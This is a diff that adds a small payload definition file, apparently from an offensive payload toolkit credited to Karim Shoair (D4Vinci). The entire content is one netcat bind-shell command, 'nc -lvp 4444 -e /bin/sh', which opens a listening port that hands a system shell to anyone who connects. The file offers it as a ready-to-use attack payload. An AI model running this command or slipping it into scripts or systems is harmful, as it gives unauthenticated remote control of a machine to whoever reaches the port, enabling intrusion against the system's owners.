@@ -1,0 +1,7 @@
+[Info]
+Author      = Karim shoair (D4Vinci)
+Description = Uses netcat tool to setup a bind shell
+
+[Payload]
+Type     = Other
+Payload  = nc -lvp 4444 -e /bin/sh
